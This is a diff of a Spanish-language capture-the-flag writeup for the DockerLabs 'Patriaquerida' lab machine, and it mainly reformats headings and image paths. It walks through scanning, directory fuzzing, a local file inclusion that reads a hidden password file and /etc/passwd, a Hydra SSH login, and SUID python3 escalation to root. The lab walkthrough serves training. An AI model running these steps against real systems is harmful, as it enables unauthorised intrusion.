@@ -1,22 +1,30 @@
-# 🖥️ Writeup - Patriaquerida 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# Patriaquerida ​​
+
+## 🖥️ Writeup - Patriaquerida
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `Web` `LFI` `Gobuster` `Wfuzz` `Hydra` `Lateral Movement` `SUID` `Python`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip patriaquerida.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh patriaquerida.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-13 16:18 CEST
 Nmap scan report for 172.17.0.2
@@ -83,7 +92,7 @@ Tenemos abiertos los puertos `22` y `80`.
 
 Accedemos por `HTTP` y nos encontramos con una página por defecto de `Apache2`.
 
-# GOBUSTER
+## GOBUSTER
 
 Realizamos `fuzzing` de directorios para intentar localizar directorios o archivos ocultos.
 
@@ -92,6 +101,7 @@ gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/D
 ```
 
 Info:
+
 ```
 ===============================================================
 Gobuster v3.8
@@ -121,7 +131,7 @@ Bienvenido al servidor CTF Patriaquerida.¡No olvides revisar el archivo oculto 
 
 De este mensaje deducimos que podemos utilizar `LFI` (Local File Inclusion) para intentar leer el archivo oculto en `/var/www/html/`.
 
-# LFI
+## LFI
 
 Usamos wfuzz para encontrar un parámetro que nos permita incluir un archivo.
 
@@ -130,6 +140,7 @@ wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-
 ```
 
 Info:
+
 ```
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -151,7 +162,7 @@ Identificamos el parámetro `page`, por lo que podemos emplearlo para leer el ar
 http://172.17.0.2/index.php?page=/var/www/html/.hidden_pass
 ```
 
-![alt text](../../images/balu.png)
+![alt text](../../.gitbook/assets/balu.png)
 
 Obtenemos la hidden pass, pero asumiendo que se trata de una contraseña aún nos falta un usuario. Por ello aprovechamos el `LFI` para revisar el contenido de `/etc/passwd`.
 
@@ -159,7 +170,7 @@ Obtenemos la hidden pass, pero asumiendo que se trata de una contraseña aún no
 http://172.17.0.2/index.php?page=/etc/passwd
 ```
 
-![alt text](../../images/etc.png)
+![alt text](../../.gitbook/assets/etc.png)
 
 Allí encontramos dos usuarios: `mario` y `pinguino`.
 
@@ -170,6 +181,7 @@ hydra -l pinguino -p balu ssh://172.17.0.2 -t 60
 ```
 
 Info:
+
 ```
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -180,10 +192,9 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-13 16:31:
 [22][ssh] host: 172.17.0.2   login: pinguino   password: balu
 ```
 
-Confirmamos credenciales válidas para `pinguino` : `balu`.
-Accedemos por `SSH`.
+Confirmamos credenciales válidas para `pinguino` : `balu`. Accedemos por `SSH`.
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Una vez dentro, encontramos en su directorio un archivo `.txt` que contiene la contraseña del usuario `mario`.
 
@@ -206,6 +217,7 @@ find / -perm -4000 -type f 2>/dev/null
 ```
 
 Info:
+
 ```
 /usr/bin/umount
 /usr/bin/man
@@ -229,6 +241,7 @@ Observamos que el binario `python3` tiene permisos `SUID`, lo que podemos aprove
 ```
 
 Info:
+
 ```
 # whoami
 root
